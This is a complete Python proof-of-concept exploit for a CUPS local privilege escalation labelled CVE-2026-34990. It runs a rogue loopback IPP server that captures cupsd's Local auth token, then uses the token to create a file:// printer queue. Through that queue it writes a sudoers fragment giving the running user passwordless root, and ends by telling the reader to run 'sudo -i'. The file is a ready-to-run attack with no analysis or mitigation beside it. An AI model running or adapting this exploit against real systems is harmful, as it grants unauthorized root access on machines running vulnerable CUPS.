#!/usr/bin/env python3
"""
CVE-2026-34990 minimal PoC
CUPS <= 2.4.16 local privesc: leak cupsd's Local auth token via a rogue
IPP server, then abuse file:// device-uri to write a sudoers fragment.
Python 3 stdlib only.

Usage: python3 poc.py       (then: sudo -i)
"""

import getpass, gzip, os, socket, struct, subprocess, sys, threading, time

USER = getpass.getuser()
CUPS = ("127.0.0.1", 631)
ROGUE = ("127.0.0.1", 9189)

def attr(tag, name, val):
    n, v = name.encode(), (val if isinstance(val, bytes) else val.encode())
    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v

def ipp_req(op, rid, attrs, printer_attrs=None, body=b""):
    buf = struct.pack(">BBHI", 2, 0, op, rid)            # IPP 2.0, op, request-id
    buf += b"\x01"                                       # operation-attributes-tag
    for a in attrs: buf += a
    if printer_attrs:
        buf += b"\x04"                                   # printer-attributes-tag
        for a in printer_attrs: buf += a
    buf += b"\x03"                                       # end-of-attributes
    return buf + body

def common_attrs():
    return [attr(0x47, "attributes-charset", "utf-8"),
            attr(0x48, "attributes-natural-language", "en"),
            attr(0x42, "requesting-user-name", USER)]

def ipp_post(path, payload, token=None):
    hdrs = (f"POST {path} HTTP/1.1\r\nHost: {CUPS[0]}:{CUPS[1]}\r\n"
            f"Content-Type: application/ipp\r\nContent-Length: {len(payload)}\r\n")
    if token:
        hdrs += f"Authorization: Local {token}\r\n"
    hdrs += "Connection: close\r\n\r\n"
    with socket.create_connection(CUPS, timeout=5) as s:
        s.sendall(hdrs.encode() + payload)
        resp = b""
        while True:
            chunk = s.recv(65536)
            if not chunk: break
            resp += chunk
    _, _, body = resp.partition(b"\r\n\r\n")
    return struct.unpack(">H", body[2:4])[0] if len(body) >= 4 else -1

# Step 1: Rogue IPP server to capture the Local token

captured_token = None

def rogue_server():
    global captured_token
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(ROGUE)
    srv.listen(2)
    srv.settimeout(15)
    deadline = time.time() + 15
    while time.time() < deadline and not captured_token:
        try:
            c, _ = srv.accept()
        except socket.timeout:
            continue
        with c:
            c.settimeout(5)
            data = b""
            while b"\r\n\r\n" not in data:
                x = c.recv(4096)
                if not x: break
                data += x
            # look for the replayed token
            for line in data.decode("latin1", "replace").splitlines():
                if line.lower().startswith("authorization: local "):
                    captured_token = line.split(None, 2)[2]
            if captured_token:
                # send a valid 200 so cupsd is happy
                ipp_ok = (b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
                          b"\x47\x00\x12attributes-charset\x00\x05utf-8"
                          b"\x48\x00\x1battributes-natural-language\x00\x02en\x03")
                c.sendall(f"HTTP/1.1 200 OK\r\nContent-Length: {len(ipp_ok)}\r\n"
                          f"Connection: close\r\n\r\n".encode() + ipp_ok)
            else:
                # 401 with Local challenge \u2192 cupsd will retry with its token
                c.sendall(b"HTTP/1.1 401 Unauthorized\r\n"
                          b"WWW-Authenticate: Local trc=\"y\"\r\n"
                          b"Content-Length: 0\r\nConnection: close\r\n\r\n")
    srv.close()

# Step 2: Coerce cupsd to connect to our rogue server 

def coerce():
    body = ipp_req(0x4028, 1,                           # CUPS-Create-Local-Printer
        common_attrs() + [attr(0x45, "printer-uri", f"ipp://localhost:{CUPS[1]}/")],
        [attr(0x42, "printer-name", "leak"),
         attr(0x45, "device-uri", f"ipp://{ROGUE[0]}:{ROGUE[1]}/ipp/print")])
    try:
        ipp_post("/", body)
    except Exception:
        pass  # response doesn't matter, we just need the outbound connection

# Step 3: Write sudoers via file:// queue

def write_sudoers(token):
    name = f"pwn{int(time.time()) % 99999}"
    printer_uri = f"ipp://localhost:{CUPS[1]}/printers/{name}"
    target = f"/etc/sudoers.d/{USER}-pwn"

    # create printer with file:// device-uri (FileDevice bypass via persistent queue)
    ipp_post("/admin/", ipp_req(0x4003, 10,             # CUPS-Add-Modify-Printer
        common_attrs() + [attr(0x45, "printer-uri", printer_uri)],
        [attr(0x45, "device-uri", f"file://{target}"),
         attr(0x42, "printer-name", name),
         attr(0x42, "ppd-name", "raw"),
         attr(0x22, "printer-is-temporary", b"\x00"),   # false \u2192 persistent
         attr(0x22, "printer-is-accepting-jobs", b"\x01"),
         attr(0x21, "printer-state", struct.pack(">i", 3))]),
        token=token)

    # enable it
    ipp_post("/admin/", ipp_req(0x4008, 11,             # CUPS-Accept-Jobs
        common_attrs() + [attr(0x45, "printer-uri", printer_uri)]), token=token)
    ipp_post("/admin/", ipp_req(0x0011, 12,             # Resume-Printer
        common_attrs() + [attr(0x45, "printer-uri", printer_uri)]), token=token)

    # print the sudoers payload
    payload = gzip.compress(f"{USER} ALL=(ALL) NOPASSWD: ALL\n".encode())
    ipp_post(f"/printers/{name}", ipp_req(0x0002, 13,   # Print-Job
        common_attrs() + [
            attr(0x45, "printer-uri", printer_uri),
            attr(0x49, "document-format", "application/vnd.cups-raw"),
            attr(0x44, "compression", "gzip"),
            attr(0x42, "job-name", "pwn")],
        body=payload), token=token)

    time.sleep(1)
    return target

def main():
    print(f"[*] CVE-2026-34990 | user={USER} | cupsd={CUPS[0]}:{CUPS[1]}")

    t = threading.Thread(target=rogue_server, daemon=True)
    t.start()
    time.sleep(0.3)

    print("[*] coercing cupsd \u2192 rogue server ...")
    coerce()
    t.join(timeout=16)

    if not captured_token:
        sys.exit("[-] token leak failed - cupsd not root or not reachable?")
    print(f"[+] captured token: {captured_token}")

    print("[*] writing sudoers ...")
    path = write_sudoers(captured_token)
    print(f"[+] wrote {path}")

    r = subprocess.run(["sudo", "-n", "id"], capture_output=True, text=True)
    if r.returncode == 0:
        print(f"[+] ROOT: {r.stdout.strip()}")
        print("[*] run: sudo -i")
    else:
        print("[-] sudo check failed - might need a moment, try: sudo -i")

if __name__ == "__main__":
    main()
